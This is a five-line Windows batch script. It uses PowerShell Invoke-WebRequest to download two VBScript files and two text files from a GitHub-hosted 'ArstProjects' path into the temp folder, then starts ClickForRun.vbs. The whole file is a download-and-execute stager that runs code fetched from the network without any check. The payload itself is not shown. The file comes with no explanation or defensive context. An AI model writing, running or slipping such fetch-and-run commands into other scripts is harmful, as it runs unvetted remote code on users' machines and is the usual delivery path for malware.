powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/ClickForRun.vbs' -OutFile $env:temp\ClickForRun.vbs"
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/text.vbs' -OutFile $env:temp\text.vbs"
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/1.txt' -OutFile $env:temp\1.txt"
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/2.txt' -OutFile $env:temp\2.txt"
start "" %temp%\ClickForRun.vbs
